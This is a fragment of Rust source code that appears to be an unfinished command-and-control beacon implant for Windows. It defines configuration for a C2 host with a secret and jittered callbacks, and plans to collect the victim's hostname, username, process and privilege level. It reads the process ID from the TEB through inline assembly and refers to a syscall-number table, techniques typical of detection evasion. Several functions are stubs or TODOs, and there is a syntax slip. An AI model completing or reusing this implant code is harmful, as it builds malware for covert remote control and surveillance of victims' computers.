use crate::debug;
use crate::core::ssn_table;

pub struct C2Config<'a> {
    pub host: &'a [u16],
    pub port: u16,
    pub use_https: bool,
    pub secret: &'a [u8],
    pub interval_ms: u64,
    pub jitter_pct: u8,
}

struct SysInfo {
    hostname: String,
    username: String,
    os_version: String,
    pid: u32,
    process_name: String,
    arch: &'static str,
    integrity: &'static str,
}

unsafe fn generate_session_id() -> String {
    let pid = get_current_pid();
    let tsc: u64;
    core::arch::asm!(
        "rdtsc",
        "shl rdx, 32", 
        "or rax, rdx",
        out("rax") tsc,
        out("rdx") _
    );

    let mut hash = 0x811c9dc5u32;
    for &b in &pid.to_le_bytes() {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
    }
    for &b in &tsc.to_le_bytes() {
        hash ^= b as u32;
        hash = hash.wrapping_mul(0x01000193);
    }

    let hex_chars = b"0123456789abcdef";
    let mut id = String::with_capacity(8);
    for i in (0..8).rev() {
        let nibble = ((hash >> (i * 4)) & 0xF) as usize;
        id.push(hex_chars[nibble] as char);
    }
    id
}

unsafe fn get_current_pid() -> u32 {
    let teb: u64;
    core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);    
    let pid_ptr = (teb + 0x40) as *const u64; // TEB.ClientId.UniqueProcess at offset 0x40 on x64
    *pid_ptr as u32
}

unsafe fn gather_sysinfo() {
    unimplemented!()
}

pub unsafe fn beacon_loop(config: &C2Config) {
    if !ssn_table::initialize_network() {
        return;
    }

    let key = todo!("build crypto engine");

    let session_id = generate_session_id();
    debug!("[BEACON] SessionID: {}", session_id);

    let sysinfo = gather_sysinfo();
    // debug!("[BEACON] {}@{} PID:{} ({})", sysinfo.username, sysinfo.hostname, sysinfo.pid, sysinfo.integrity);

    let session = match HttpSession::new(config.host, config.port, config.use_https) {
        Some(s) => s,
        None =>  return,
    }

    // TODO: Establish HTTP session
}